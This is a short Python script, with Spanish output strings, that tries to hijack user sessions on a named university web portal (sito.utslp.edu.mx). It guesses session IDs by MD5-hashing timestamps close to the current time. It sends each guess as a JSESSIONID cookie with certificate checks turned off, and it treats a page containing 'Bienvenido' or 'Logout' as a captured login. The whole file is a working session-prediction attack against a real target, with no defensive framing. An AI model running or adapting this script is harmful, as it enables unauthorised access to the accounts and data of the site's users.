import requests
import hashlib
import time

def predict_jsession():
    base_time = int(time.time())
    for offset in range(-10, 10):
        seed = base_time + offset
        session_id = hashlib.md5(str(seed).encode()).hexdigest().upper()[:16]
        cookies = {'JSESSIONID': session_id}
        r = requests.get('https://sito.utslp.edu.mx/jsp/', cookies=cookies, verify=False)
        if 'Bienvenido' in r.text or 'Logout' in r.text:
            print(f"Session ID válido encontrado: {session_id}")
            return session_id
    return None
